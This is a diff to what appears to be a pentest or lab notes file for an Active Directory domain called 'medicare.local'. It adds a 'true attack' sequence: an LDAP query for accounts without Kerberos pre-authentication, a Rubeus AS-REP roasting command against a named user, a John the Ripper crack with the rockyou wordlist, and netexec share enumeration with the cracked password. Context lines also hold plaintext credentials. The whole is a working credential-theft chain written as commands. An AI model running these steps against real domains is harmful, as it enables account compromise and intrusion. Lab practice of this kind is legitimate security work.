@@ -12,6 +12,19 @@ smbclientng -u Administrator -p "admin123;" -d medicare.local --host medicare.lo
 
 ## true attack
 
-use rubeus for asreproast
-crack hash of asreproast with john
+## use ldap for search asreproast account
+
+sa-ldapsearch (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+
+## use rubeus for asreproast
+
+rubeus asreproast /user:allegra.dosi /domain:medicare.local /dc:medicare.local
+
+## crack hash of asreproast with john
+
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash
+john hash --show
+
+## scan share with asrep account
+
 nxc smb medicare.local -u "allegra.dosi" -p "123123" --shares
